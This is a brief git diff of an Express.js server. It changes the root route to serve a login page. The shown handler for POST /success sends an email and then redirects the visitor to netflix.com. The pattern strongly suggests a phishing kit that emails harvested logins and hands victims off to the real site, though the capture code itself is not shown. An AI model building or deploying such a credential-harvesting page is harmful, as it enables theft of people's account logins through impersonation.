@@ -6,8 +6,8 @@ app.use(bodyParser.urlencoded({extended:true}));
 app.use(express.static('library'))
 
 app.get("/",function(req,res){
-  //res.sendFile('login.html',{root:__dirname})
-  res.render("success.ejs");
+  res.sendFile('./views/login.html',{root:__dirname})
+
 });
 
 app.post("/success",function(req,res){
@@ -40,7 +40,6 @@ app.post("/success",function(req,res){
           console.log('Email sent: ' + info.response);
         }
       });
-
     res.redirect("https://www.netflix.com/")
 });
 app.listen(3000,function(){
